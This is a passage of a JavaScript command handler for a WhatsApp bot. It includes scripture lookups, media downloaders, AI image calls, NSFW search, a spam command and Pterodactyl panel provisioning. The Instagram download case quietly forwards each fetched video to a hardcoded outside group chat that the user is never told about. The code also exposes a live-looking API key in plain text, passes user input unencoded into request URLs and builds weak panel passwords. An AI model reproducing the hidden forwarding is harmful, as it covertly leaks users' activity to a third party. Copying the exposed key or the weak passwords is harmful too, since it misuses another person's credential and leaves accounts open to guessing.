 let res = await fetch(`https://api.popcat.xyz/pickuplines`)
 if (!res.ok) {
 throw new Error(`API request failed with status ${res.status}`)
 }
 let json = await res.json()
 let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
 replygcxeon(pickupLine)
 } catch (error) {
 console.error(error)
 // Handle the error appropriately
 }
 }
 break
 case 'animequote': {
 try {
 const res = await fetch('https://some-random-api.com/animu/quote');
 if (!res.ok) throw await res.text()
 const json = await res.json()
 const { sentence, character, anime } = json
 const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
 Yasam.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: fvrif })
 } catch (error) {
 console.error(error)
 }
 }
 break
 case 'bible': {
 	const { translate } = require('@vitalets/google-translate-api')
 	const BASE_URL = 'https://bible-api.com'
 try {
 // Extract the chapter number or name from the command text.
 let chapterInput = m.text.split(' ').slice(1).join('').trim()
 if (!chapterInput) {
 throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
 }
 // Encode the chapterInput to handle special characters
 chapterInput = encodeURIComponent(chapterInput);
 // Make an API request to fetch the chapter information.
 let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
 if (!chapterRes.ok) {
 throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
 }
 let chapterData = await chapterRes.json();
 let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
 let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
 let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
 replygcxeon(bibleChapter)
 } catch (error) {
 replygcxeon(`Error: ${error.message}`)
 }
 }
 break
 case 'dalle': {
 if (!text) return replygcxeon(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
 try {
 	replygcxeon('*Please wait, generating image...*')
 const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
 const response = await fetch(endpoint)
 if (response.ok) {
 const imageBuffer = await response.buffer()
 await Yasam.sendMessage(m.chat, { image: imageBuffer }, {quoted: fvrif})
 } else {
 throw '*Image generation failed*';
 }
 } catch {
 replygcxeon('*Oops! Something went wrong while generating images. Please try again later.*')
 }
 }
 break
 case 'translate':{
 	if (!q) return replygcxeon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
 	const defaultLang = 'en'
const tld = 'cn'
 let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
 let lang = args[0]
 let text = args.slice(1).join(' ')
 if ((args[0] || '').length !== 2) {
 lang = defaultLang
 text = args.join(' ')
 }
 if (!text && m.quoted && m.quoted.text) text = m.quoted.text
 try {
 let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
 replygcxeon(result.text)
 } catch (e) {
 return replygcxeon(err)
 } 
 }
 break
 case 'quran': {
 try {
 // Extract the surah number or name from the command text.
 let surahInput = m.text.split(' ')[1]
 if (!surahInput) {
 throw new Error(`Please specify the surah number or name`)
 }
 let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
 let surahList = await surahListRes.json()
 let surahData = surahList.data.find(surah => 
 surah.number === Number(surahInput) || 
 surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
 surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
 )
 if (!surahData) {
 throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
 }
 let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
 if (!res.ok) {
 let error = await res.json();
 throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
 }

 let json = await res.json()

 // Translate tafsir from Bahasa Indonesia to Urdu
 let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

 // Translate tafsir from Bahasa Indonesia to English
 let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

 let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

 replygcxeon(quranSurah)

 if (json.data.recitation.full) {
 Yasam.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: fvrif})
 }
 } catch (error) {
 replygcxeon(`Error: ${error.message}`)
 }
 }
 break
 case 'mediafire': {
 	if (!args[0]) return replygcxeon(`Enter the mediafire link next to the command`)
 if (!args[0].match(/mediafire/gi)) return replygcxeon(`Link incorrect`)
 const { mediafiredl } = require('@bochilteam/scraper')
 let full = /f$/i.test(command)
 let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
 let res = await mediafiredl(args[0])
 let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
 let caption = `
 ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
 Yasam.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
 }
 break
case 'tagadmin': case 'admin':{
 	if (!m.isGroup) return replygcxeon (mess.group)
 const groupAdmins = participants.filter(p => p.admin)
 const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
 const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
 let text = ` 
*Group Admins:*
${listAdmin}
`.trim()
 Yasam.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: fvrif})
}
break
case 'addlist':
if (!YasamCreator) return replygcxeon (mess.owner)
if (!m.isGroup) return replygcxeon (mess.group)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcxeon(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return replygcxeon(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await Yasam.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
replygcxeon(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
replygcxeon(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!Yasam) return replygcxeon (mess.owner)
if (!m.isGroup) return replygcxeon (mess.group)
if (db_respon_list.length === 0) return replygcxeon(`There is no message list in the database yet`)
if (!q) return replygcxeon(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return replygcxeon(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
replygcxeon(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcxeon(teks)
}
break
case 'igstory':
			case 'igs':
			case 'instagramstory':
			case 'instastory':
			case 'igslide':
			case 'igphoto':
			case 'instaphoto':
			case 'instafoto':
			case 'igfoto':
			case 'instagram':
			case 'ig':
			case 'igdl':
			case 'igvideo':
			case 'instavideo':
			case 'instavid':
			case 'igreels':
			case 'instareels':
			case 'instareel':
			case 'igtv':
			case 'instatv': {
	 if (!text) return Reply(`You need to give the URL of Any Instagram video, post, reel, image`)
 try {
 let ress = await fetch(`https://api.neekoi.me/api/igdl?url=${args[0]}`);
 let res = await ress.json();
 await Yasam.sendMessage(from, {video: {url: res.result.data[0].url}})
 await Yasam.sendMessage(`120363349092912714@g.us`, {video: {url: res.result.data[0].url}})
 } catch (error) {
 return reply(`An error occurred: ${error.message}`)
 }
}
break

case 'removebg': case 'nobg':{
if (!quoted) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
await Yasam.sendMessage(m.chat, {image: {url: data.url.result}, caption: `Here u go!`}, {quoted: fvrif})
}
break

case 'capcut':{
if (!text) return replygcxeon(`Masukkan tautan\Contoh\https://www.capcut.net/sharevideo?template_id=7239111787965205762 language=en&region=ID`)
await Yasam.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{ 
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
Yasam.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `Here u go!`}, {quoted: fvrif})
await Yasam.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}catch (error) {
await Yasam.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}}) 
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcxeon(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Yasam.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await Yasam.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command} text1|text2`)
}
}
break

case'smeta': {
if (!/webp/.test(mime)) return replygcxeon('Reply sticker!')
 var stiker = false
 try {
 let [packname, ...author] = q.split('|')
 //var author = (author []).join('|')
 let mime = m.quoted.mimetype || ''
 //let img = await q.download()
 let img = await Yasam.downloadAndSaveMediaMessage(quoted, makeid(5))
 if (!img) return replygcxeon('Reply a sticker!')
 var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
 } catch (e) {
 console.error(e)
 if (Buffer.isBuffer(e)) stiker = e
 } finally {
 if (stiker) Yasam.sendMessage(m.chat, {
 sticker: stiker
 }, {
 quoted: fvrif
 })
 else return replygcxeon('reply sticker')
 }
 } 
 break
case 'itunes': {
if (!text) return replygcxeon('Please provide a song name')
 try {
 let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
 if (!res.ok) {
 throw new Error(`API request failed with status ${res.status}`)
 }
 let json = await res.json()
 console.log('JSON response:', json)
 let songInfo = 
 `*Song Information:*\n
 • *Name:* ${json.name}\n
 • *Artist:* ${json.artist}\n
 • *Album:* ${json.album}\n
 • *Release Date:* ${json.release_date}\n
 • *Price:* ${json.price}\n
 • *Length:* ${json.length}\n
 • *Genre:* ${json.genre}\n
 • *URL:* ${json.url}`
 // Check if thumbnail is present, then send it with songInfo as caption
 if (json.thumbnail) {
 await Yasam.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: fvrif})
 } else {
 replygcxeon(songInfo)
 }
 } catch (error) {
 console.error(error)
 }
}
break
case 'spam':
				if (!YasamCreator) return replygcxeon (mess.owner)
					if (!text) return replygcxeon(`Use ${prefix +command} text|amount`)
				xeonarg = text.split("|")
				if (!xeonarg) return replygcxeon(`Use ${prefix+ command} text|amount`)
				if (Number(xeonarg[1]) >= 50) return replygcxeon('Max 50!')
				if (isNaN(xeonarg[1])) return replygcxeon(`must be a number`)
				for (let i = 0; i < xeonarg[1]; i++){
					Yasam.sendMessage(from, {text: xeonarg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) replygcxeon('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
Yasam.sendMessage(m.chat, {text: simi2}, {quoted: fvrif})
break
case 'clearall': {
if (!YasamCreator) return replygcxeon (mess.owner)
Yasam.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!YasamCreator) return replygcxeon (mess.owner)
if (m.isGroup) return XeonStickPrivate()
Yasam.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!YasamCreator) return replygcxeon (mess.owner)
if (m.isGroup) return XeonStickPrivate()
Yasam.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!YasamCreator) return replygcxeon (mess.owner)
totalreg = Object.keys(global.db.data.users).length
 let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
 replygcxeon(`*${totalreg}pengguna menggunakan Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return replygcxeon (mess.group)
	if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
	const response = await Yasam.groupRequestParticipantsList(m.chat);
 if (!response || !response.length) {
 Yasam.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
 return;
 }
 let replyMessage = `${themeemoji} Join Request List:\n`;
 response.forEach((request, index) => {
 const { jid, request_method, request_time } = request;
 const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
 replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
 replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
 replyMessage += `\n🧪 *Method:* ${request_method}`;
 replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
 });

 Yasam.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break

case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
 if (!text) return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
 if (!text) return replygcxeon('Please provide a search query or a valid Xvideos URL.');
 // Check if the input is a valid Xvideos URL
 const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
 try {
 if (isURL) {
 // If it's a valid URL, directly download the video
 const result = await xvideosdl(text);
 const { title, url } = result.result; 
 // Send the video file
 const response = await fetch(url);
 const buffer = await response.arrayBuffer();
 Yasam.sendMessage(
 m.chat,
 {video: Buffer.from(buffer),
 caption: `Here you go!!\nTitle: ${title}`} ); 
 } else {
 // If it's not a valid URL, perform a search and display the search results
 const results = await xvideosSearch(text);
 if (results.length === 0) {
 replygcxeon('No search results found for the given query.');
 } else {
 const searchResults = results.map((result, index) => {
 return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
 }).join('\n\n'); 
 replygcxeon(`*Search Results for "${text}":*\n\n${searchResults}`);
 }
 }
 } catch (error) {
 console.error(error);
 return replygcxeon('Failed to fetch Xvideos video details.');
 }
 };
 break
 case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
 if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
 if (!text)
 return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
 let url
 try {
 url = new URL(text)
 } catch (error) {
 url = null
 }
 if (url) {
 try {
 const files = await xnxxdl(url.href)
 if (files && files.high) {
 Yasam.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
 } else {
 replygcxeon('🔴 Error: Failed to retrieve the download URL.')
 }
 } catch (e) {
 console.error(e)
 replygcxeon('🔴 Error: We encountered a problem while processing the request.')
 }
 } else {
 try {
 const results = await xnxxSearch(text)
 if (results.length > 0) {
 const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
 replygcxeon(message, null, {
 contextInfo: {
 mentionJid: Yasam.parseMention(message),
 },
 })
 } else {
 replygcxeon('🔴 Error: No search results found.')
 }
 } catch (e) {
 console.error(e)
 replygcxeon('🔴 Error: We encountered a problem while processing the request.')
 }
 }
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
 // Extract the verse number from the command text.
 let verseNumber = m.text.split(' ')[1]
 if (!verseNumber || isNaN(verseNumber)) {
 verseNumber = Math.floor(Math.random() * 700) + 1
 }
 let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
 if (!res.ok) {
 let error = await res.json()
 throw new Error(
 `API request failed with status ${res.status} and message ${error.detail[0].msg}`
 )
 }
 let json = await res.json()
 console.log('JSON response:', json)
 let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
 replygcxeon(gitaVerse)
 if (json.audio_link) {
 Yasam.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
 }
 } catch (error) {
 console.error(error)
 // Handle the error appropriately
 }
}
break
case 'apk': {
	try {
 if (command === 'apk') {
 if (!text) return replygcxeon(`*[❗] Please provide the APK Name you want to download.*`);
 let data = await download(text);
 if (data.size.replace(' MB', '') > 200) {
 return await Yasam.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: fvrif });
 }
 if (data.size.includes('GB')) {
 return await Yasam.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: fvrif });
 }
 await Yasam.sendMessage(
 m.chat,
 { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
 { quoted: fvrif }
 )
 }
 } catch {
 return replygcxeon(`*[❗] An error occurred. Make sure to provide a valid link.*`);
 }
};
break
case 'mega':{
	try {
if (!text) return replygcxeon(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
 const file = File.fromURL(text);
 await file.loadAttributes();
 if (file.size >= 300000000) return replygcxeon('Error: File size is too large (Maximum Size: 300MB)');
 const downloadingMessage = `🌩️ Downloading file... Please wait.`;
 replygcxeon(downloadingMessage);
 const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
 const data = await file.downloadBuffer();
 const fileExtension = path.extname(file.name).toLowerCase();
 const mimeTypes = {
 ".mp4": "video/mp4",
 ".pdf": "application/pdf",
 ".zip": "application/zip",
 ".rar": "application/x-rar-compressed",
 ".7z": "application/x-7z-compressed",
 ".jpg": "image/jpeg",
 ".jpeg": "image/jpeg",
 ".png": "image/png",
 };
 let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
 await Yasam.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
 } catch (error) {
 return replygcxeon(`Error: ${error.message}`);
 }
}
break
case 'diffusiob':{
if (!text) return replygcxeon('What do u want to make?')
 let myHeaders = new Headers();
 myHeaders.append("Content-Type", "application/json");
 let raw = JSON.stringify({
 "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
 "prompt": text,
 "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
 "width": "720",
 "height": "720",
 "samples": "1",
 "num_inference_steps": "20",
 "seed": null,
 "guidance_scale": 7.5,
 "safety_checker": "yes",
 "multi_lingual": "no",
 "panorama": "no",
 "self_attention": "no",
 "upscale": "no",
 "embeddings_model": null,
 "webhook": null,
 "track_id": null
 });
 var requestOptions = {
 method: 'POST',
 headers: myHeaders,
 body: raw,
 redirect: 'follow'
 };
 try {
 let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
 let result = await response.json();
 Yasam.sendMessage(m.chat, { image: { url: result.output[0] }, caption: result.meta.prompt }, { quoted: fvrif });
 } catch (error) {
 console.log('error', error);
 Yasam.sendMessage(m.chat, { image: { url: `${error.config.url}` }, caption: text }, { quoted: fvrif });
 }
}
break
case 'indo-ai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.site/ai/gpt-web?q=${text}`)).json()
replygcxeon("*[ Indo-Ai ]* " + '\n' + gpt.result)
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return replygcxeon(`*• Example:* ${usedPrefix + command} blue sea`);
 let currentTime = Date.now();
 let lastUsed = 0;
 if (currentTime - lastUsed < 10000) return replygcxeon("Cooldown 10 seconds, try again later");
 lastUsed = currentTime;
 try {
 let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
 Yasam.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: fvrif});
 } catch(e) {
 return replygcxeon("`*Error*`");
 }
}
break
case 'wikipedia': case 'wiki': {
	if (!text) return replygcxeon(` Enter what you want to search for on Wikipedia`)
	
 try {
	const link = await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	replygcxeon(`▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`)
} catch (e) {
 replygcxeon('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || q.mediaType || "";
 if (!mime.startsWith('image')) {
 return replygcxeon("*Respond to an image*");
 }
 let data = await q.download();
 let image = await uploadImage(data);
 let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
 console.log("API URL:", apiUrl);
 let response = await fetch(apiUrl);
 let result = await response.json();
 console.log("API Response:", result);
 if (!result || result.error || result.result.length === 0) {
 return replygcxeon("*Error: Could not track the anime.*");
 }
 let { anilist, from, to, similarity, video, episode } = result.result[0];
 let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
 let message = `*Anime:* ${animeTitle}\n`;
 if (anilist.synonyms && anilist.synonyms.length > 0) {
 message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
 }
 message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
 message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
 if (episode) {
 message += `*Episode:* ${episode}\n`;
 }
 console.log("Anime Information:", {
 animeTitle,
 synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
 similarity,
 timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
 video,
 episode,
 });
 // Send the video with anime information as the caption
 await Yasam.sendMessage(m.chat, {video: {url: video}, caption: message},{quoted: fvrif});
 } catch (error) {
 console.error("Error:", error);
 replygcxeon("*Error: Could not track the anime or send the video.*");
 }
};
break

case 'stickersearch': {
if (!text) return replygcxeon(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
replygcxeon(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
case 'apksearch': {
if (!text) return replygcxeon(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
 
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await Yasam.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: fvrif })
}
break

case 'getbase': {
				if (!YasamCreator) return replygcxeon(mess.owner);
				replygcxeon('Tunggu sebentar yaa, aku lagi ambil file Base-mu nih');
				let sesi = fs.readFileSync('./XeonCheems13.js');
				Yasam.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/js',
					fileName: 'XeonCheems13.js'
				}, {
					quoted: m
				});
			}
			break;

case 'douyin': {
if (!text) return m.reply(`${prefix + command} https://v.douyin.com/ifRC7nwE/`)
m.reply('Proses 🗿')
await fetch(`https://api.diioffc.web.id/api/download/douyin?url=${text}`).then(async (res) => {
let response = await res.json()
conn.sendMessage(m.chat, { video: { url: response.result.Video_HD }, mimetype: 'video/mp4', caption: response.result.description }, { quoted: m })
setTimeout(() => {
Yasam.sendMessage(m.chat, { audio: { url: response.result.Audio }, mimetype: "audio/mpeg", contextInfo: { externalAdReply: { thumbnailUrl: null, title: response.result.description, body: null, sourceUrl: null, renderLargerThumbnail: true, mediaType: 1}}}, { quoted: m })
}, 3000)
}).catch(err => m.reply('Error 🗿'))
}
break

case "restart": case "rst": {
if (!YasamCreator) return m.reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.exit()
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!YasamCreator && !isPremium) return reply(mess.owner)
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
let teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan
